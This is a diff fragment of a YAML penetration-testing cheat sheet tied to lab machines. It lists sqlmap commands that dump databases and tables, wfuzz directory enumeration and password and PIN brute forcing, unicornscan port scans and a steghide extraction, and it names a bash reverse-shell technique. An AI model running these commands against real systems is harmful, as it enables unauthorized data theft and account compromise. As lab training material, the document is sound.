+      \ -D webapphacking --dump-all --batch\npost requests:\n  sqlmap -u \"http://example.com/\"\
+      \ --data \"a=1&b=2&c=3\" -p \"a,b\" --method POST\nintrusive scans:\n  sqlmap\
+      \ --level 5 --risk 3\nlist databses:\n  sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos\"\
+      \ --dbs\nlist tables within a database:\n  sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos\"\
+      \ -D gallery --tables\ndump a table:\n  sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos\"\
+      \ -D gallery -T dev_accounts --dump\nblind sql enumeration:\n  sqlmap -u \"\
+      http://<targetip>:<targetport>/index.php\" --forms --dbs\n"
     description: sqlmap
   - cli: 'steghide extract -sf file.jpg
 
       '
     description: steghide
-  - cli: 'scan all 64k ports:
-
-      unicornscan -vmT <targetip>:a
-
-      scan first 1k ports:
-
-      unicornscan -vmT <targetip>:p
-
-      scan in udp mode:
-
-      unicornscan -vmU <targetip>
-
-      '
+  - cli: "scan all 64k ports:\n  unicornscan -vmT <targetip>:a\nscan first 1k ports:\n\
+      \  unicornscan -vmT <targetip>:p\nscan in udp mode:\n  unicornscan -vmU <targetip>\n"
     description: unicornscan
   - cli: "enumerate directories:\n  wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
       \ \"http://127.0.0.1/index.php?vuln=../FUZZ/file1.php\"\n  wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt\
-      \ --sc 200 -t 50 http://192.168.30.129:4480/FUZZ\n  wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt\
-      \ --sc 200 -t 50 http://192.168.30.129:4488/FUZZ\nenumerate directories and\
-      \ filter on response length:\n  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+      \ --sc 200 -t 50 http://<targetip>:<targetport>/FUZZ\n  wfuzz -w common.txt\
+      \ -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t\
+      \ 50 http://<targetip>:4488/FUZZ\nenumerate directories and filter on response\
+      \ length:\n  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
       \ --hh 158607 http://bart.htb/FUZZ\nbruteforce password:\n  bruteforce a single\
       \ list:\n    wfuzz -w pwds.db -d \"user=pinkadmin&pass=FUZZ&pin=FUZ2Z\" -t 50\
-      \ --hw 6 http://192.168.30.129:4480/login.php\n  bruteforce multiple lists:\n\
+      \ --hw 6 http://<targetip>:<targetport>/login.php\n  bruteforce multiple lists:\n\
       \    wfuzz -w pwds.db -w pins.txt -d \"user=pinkadmin&pass=FUZZ&pin=FUZ2Z\"\
-      \ -t 50 --hw 6 http://192.168.30.129:4480/login.php\n  bruteforce multiple lists,\
-      \ but faster:\n    wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345'\
-      \ --hh 45 http://192.168.0.74:8080/login.php\n    wfuzz -c -z file,./pin.txt\
-      \ -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php\n"
+      \ -t 50 --hw 6 http://<targetip>:<targetport>/login.php\n  bruteforce multiple\
+      \ lists, but faster:\n    wfuzz -c -z file,./usernames.txt -z file,./pwds.db\
+      \ -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://<targetip>:<targetport>/login.php\n\
+      \    wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ'\
+      \ --hh 45,41 http://<targetip>:<targetport>/login.php\n"
     description: wfuzz
   ttpsitw:
     '10000':
@@ -8021,14 +7690,6 @@ summary:
       - enumerate_proto_mysql
       ttpsitw: []
       writeups: []
-    '3389':
-      l4: tcp
-      port: '3389'
-      protokeys: []
-      ttps:
-      - enumerate_proto_rdp
-      ttpsitw: []
-      writeups: []
     '389':
       l4: tcp
       port: '389'
@@ -8048,6 +7709,7 @@ summary:
       - enumerate_app_coldfusion_files
       - enumerate_app_coldfusion_version
       - enumerate_app_drupal
+      - enumerate_app_joomla
       - enumerate_app_phpmyadmin
       - enumerate_app_prtg
       - enumerate_app_webmin
@@ -8218,6 +7880,7 @@ summary:
       - enumerate_app_coldfusion_files
       - enumerate_app_coldfusion_version
       - enumerate_app_drupal
+      - enumerate_app_joomla
       - enumerate_app_phpmyadmin
       - enumerate_app_prtg
       - enumerate_app_webmin
@@ -8348,11 +8011,13 @@ summary:
       - enumerate_app_coldfusion_files
       - enumerate_app_coldfusion_version
       - enumerate_app_drupal
+      - enumerate_app_joomla
       - enumerate_app_phpmyadmin
       - enumerate_app_prtg
       - enumerate_app_webmin
       - enumerate_app_wordpress
       - enumerate_proto_http
+      - enumerate_proto_rdp
       - enumerate_proto_webdav
       ttpsitw:
       - exploit_bash_reverseshell
